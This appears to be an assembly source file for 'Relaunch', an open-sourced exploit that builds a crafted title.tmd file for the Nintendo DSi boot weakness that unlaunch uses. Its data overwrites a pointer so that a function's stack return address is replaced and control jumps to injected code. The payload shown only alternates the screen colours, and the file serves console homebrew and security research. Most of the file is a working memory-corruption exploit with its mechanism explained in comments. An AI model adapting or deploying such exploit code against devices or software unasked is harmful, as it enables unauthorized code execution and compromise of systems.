# Relaunch
# An open sourced exploit payload for the weakness unlaunch uses

.syntax unified

###############################
#          Constants          #
###############################

.equ SECTIONBASE        ,0x037df06c
.equ TMD_BASE           ,0x037df06c
.equ TMD_SIZE           ,0x00030000
.equ TMD_WRITECONSTANT  ,0x037F3CC0
.equ TMD_WRITEOFFSET    ,0x00000078
.equ TMD_WRITEPOINTER   ,0x037F3878
.equ TMD_STACKRETURN    ,0x02FE3558
.equ HWREG_BASE         ,0x04000000
.equ PALETTE_BASE       ,0x05000000

# The exploited code is arm32 
# We could make it return to thumb code but for simplicity all code within here
# is kept as 32 bit

.arm
.global _start

###############################
# BEGIN of the title.tmd file #
###############################

.text
.org (TMD_BASE - SECTIONBASE)

##############################
# Insert original TMD binary #
##############################

_start:
  .incbin "title.org"
 
##############################
# Fill until payload with AA #
############################## 

.org (0x037f0000 - SECTIONBASE), 0xAA

##############################
#     ! Actual Payload !     #
############################## 

# This example payload was borowed from BrokenPit and modified
# It will alternate the top screen between green and blue 
# with some delay between

setScreenColored:
  push {r0}
  mov r0, HWREG_BASE
  mov r1, #0
  str r1, [r0, #0x208]
  str r1, [r0, #0x210]
  ldr r2, [r0, #0x214]
  str r2, [r0, #0x214]
  mov r2, #(1<<16)
  str r2, [r0]
  str r1, [r0, #0x60]
  str r1, [r0, #0x6C] @ MASTER_BRIGHT FIX by Normmatt
  mov r0, PALETTE_BASE
  pop {r1}
  strh r1, [r0]
  bx lr
   
delay:
  mov r0, #0x00A00000 @ time to wait
delayloop:
  subs r0, r0, #1 @ subtract 1
  bne delayloop @ jump back if not zero
  bx lr @ return

entry:
  mov r0, #0xFC00
  BL setScreenColored
  BL delay
  mov r0, #0x03C0
  BL setScreenColored
  BL delay  
  B entry

##############################
#           EXPLOIT          #
############################## 

# The following lines trigger the exploit
# A function that is called after the .TMD is loaded uses memory that
# is overwritten by the .TMD to write the constant 037F3CC0h at a location we 
# can control.
# Pseudo code:
#   [[037F3878h]+78h] = 037F3CC0h
#
# We will overwrite the retur value of that very same function on the stack
# with the constant. Conveniantly the constant is a valid address we have 
# overwritten with the .TMD. 
#
# So with returning from the exploited function, we will start executing 
# from 037F3CC0h

.org (TMD_WRITEPOINTER - SECTIONBASE), 0xAA
  .word TMD_WRITEPOINTER+4                    @ Address of the Pointer used to 
                                              @ write the constant
  .word TMD_STACKRETURN-TMD_WRITEOFFSET       @ Thats the pointer itself, it is 
                                              @ 78h below the target
  
.org (TMD_WRITECONSTANT - SECTIONBASE), 0xAA
  B entry                                     @ We jump away here instantly, as 
                                              @ the following bytes are over-
                                              @ written in the meantime so we 
                                              @ have no control over it, but the 
                                              @ first instruction will be valid
                                              
##############################
#         Pad to 192k        #
############################## 

.org TMD_SIZE - 4, 0xAA
  .word 0xAAAAAAAA
  